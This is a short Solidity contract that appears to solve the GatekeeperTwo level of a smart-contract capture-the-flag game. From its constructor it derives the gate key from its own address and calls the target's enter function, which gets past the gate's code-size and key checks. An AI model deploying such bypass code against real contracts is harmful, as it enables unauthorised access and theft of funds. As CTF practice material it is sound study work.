// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GateKeeperTwoAttack {
    address private target;

    constructor(address _target) {
        target = _target;
        uint64 gateKey = ~uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        (bool success, ) = target.call(abi.encodeWithSignature("enter(bytes8)", bytes8(gateKey)));
        require(success, "Tricky Attack failed!");
    }

}
